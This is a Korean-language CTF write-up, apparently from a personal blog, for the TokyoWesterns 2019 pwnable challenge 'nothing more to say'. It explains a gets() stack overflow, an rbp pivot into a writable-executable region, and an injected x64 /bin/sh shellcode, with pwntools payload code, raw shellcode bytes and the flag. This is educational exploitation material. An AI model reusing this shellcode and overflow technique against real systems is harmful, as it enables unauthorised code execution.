---
layout: post
title: nothing more to say
category: Pwnable
source: "TokyoWesterns CTF 5th 2019"
rpath: /resource/nothing_more_to_say
tag: [bof, rop]
---

**Category**: Pwnable

**Source**: TokyoWesterns CTF 5th 2019

**Points**: 82

**Author**: Jisoon Park(js00n.park)

**Description:** 

> Japan is fucking hot.
> 
> nc nothing.chal.ctf.westerns.tokyo 10001
> 
> [warmup.c]({{site.github.master}}{{page.rpath}}/warmup.c)  
> [warmup]({{site.github.master}}{{page.rpath}}/warmup)


## Write-up

바이너리와 더불어 친절하게 소스코드 주어지는데, canary/NX/PIE가 모두 걸려있지 않다고 하며 ROP와 x64 shellcode를 이용해서 문제를 풀 수 있다고 안내까지 해준다.

문제를 보면 0x100 바이트 크기의 buf에 gets()를 이용해서 무한한 길이의 bof를 가능하게 해주었고, printf()를 이용해서 ~~무쓸모지만~~ fsb도 할 수 있는 여지를 주었다.

![img]({{page.rpath|prepend:site.baseurl}}/maps.png)

메모리맵을 살펴보면 0x601000 번지와 stack 영역이 rwxp로 지정되어 있는 것을 확인할 수 있다. 둘 중 아무 곳에 shellcode를 넣은 후 이쪽으로 jump 시키면 될 것 같다.

```python
r.recvuntil(":)\n")

payload = "A" * 0x100
payload += p64(0x601a00)
payload += p64(0x4006db)

r.sendline(payload)
```

이왕이면 딱 주소값이 고정되어 있는 곳을 이용해보자. rbp를 rwx 영역 중 적당한 곳으로 옮긴 후 main 함수의 proglouge 다음 부분으로 복귀하면 gets() 함수를 이용해 rbp를 기준으로 shell code를 원하는 주소에 적을 수 있다.

두번째 실행에서 shell code를 적어놓은 주소로 return 하도록 하면 shell code가 실행되어 shell을 얻을 수 있다. ([코드]({{site.github.master}}{{page.rpath}}/ex.py))

```python
sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = "A" * 0x100 + "B" * 8
payload += p64(0x601a10)
payload += sc

r.sendline(payload)
```

![img]({{page.rpath|prepend:site.baseurl}}/flag.png)

Flag : **TWCTF{AAAATsumori---Shitureishimashita.}**
